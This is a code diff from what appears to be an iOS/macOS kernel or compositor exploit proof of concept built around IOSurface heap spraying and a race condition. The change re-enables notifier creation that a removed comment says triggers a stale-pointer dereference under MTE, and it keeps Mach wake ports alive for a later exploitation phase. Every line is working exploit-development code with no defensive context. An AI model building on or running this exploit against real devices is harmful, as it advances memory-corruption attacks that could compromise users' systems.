@@ -19285,6 +19285,9 @@ new_modes:
         static IOSurfaceRef r229_matched_surf = NULL;
         static IOSurfaceRef r229_spray_static[256]; /* copy for Phase 14 access */
         static int r229_matched_idx = -1;
+        #define R229_SAVED_WPS_MAX 2048
+        static mach_port_t r229_saved_wps[R229_SAVED_WPS_MAX];
+        static int r229_saved_wp_n = 0;
 
         r229_phase13_top:
         rlog("\n--- Phase 13: Full PoC race (Metal render loop + Stage C variants) ---\n");
@@ -19741,16 +19744,7 @@ new_modes:
                 int r229_notifier_count = 0;
                 memset(r229_notifiers, 0, sizeof(r229_notifiers));
 
-                /* SKIP notifier creation entirely — creating notifiers populates
-                 * the kernel callback array, which causes the compositor to dereference
-                 * the stale notification entry's IOSurface* pointer via inner_method.
-                 * With MTE, the old tag on that pointer mismatches the new spray surface's
-                 * tag, causing an immediate crash during usleep. Wake port detection
-                 * was confirmed dead (inner returns 0 for callback_count=0 surfaces).
-                 * Go directly to crash_count check and skip bsearch.
-                 */
-                rlog("  r=229: Skipping notifier creation (causes MTE crash via compositor traversal)\n");
-                if (0 && notifier_create_fn) {
+                if (notifier_create_fn) {
                     dispatch_queue_t nq = dispatch_queue_create("com.research.notifier", DISPATCH_QUEUE_SERIAL);
                     for (int si = 0; si < 256; si++) {
                         if (r229_spray[si]) {
@@ -20136,10 +20130,17 @@ new_modes:
                     } else {
                         rlog("  r=229: match_idx unknown — keeping all 256 surfaces for Phase 14 probe\n");
                     }
+                    /* Save wake ports for Phase 14 instead of deallocating */
+                    r229_saved_wp_n = 0;
                     for (int wi = 0; wi < r229_wp_n; wi++) {
-                        if (r229_wps[wi]) mach_port_deallocate(mach_task_self(), r229_wps[wi]);
+                        if (r229_wps[wi] && r229_saved_wp_n < R229_SAVED_WPS_MAX) {
+                            r229_saved_wps[r229_saved_wp_n++] = r229_wps[wi];
+                        } else if (r229_wps[wi]) {
+                            mach_port_deallocate(mach_task_self(), r229_wps[wi]);
+                        }
                     }
                     r229_wp_n = 0;
+                    rlog("  Saved %d wake ports for Phase 14\n", r229_saved_wp_n);
 
                     /* Reset state file */
                     {
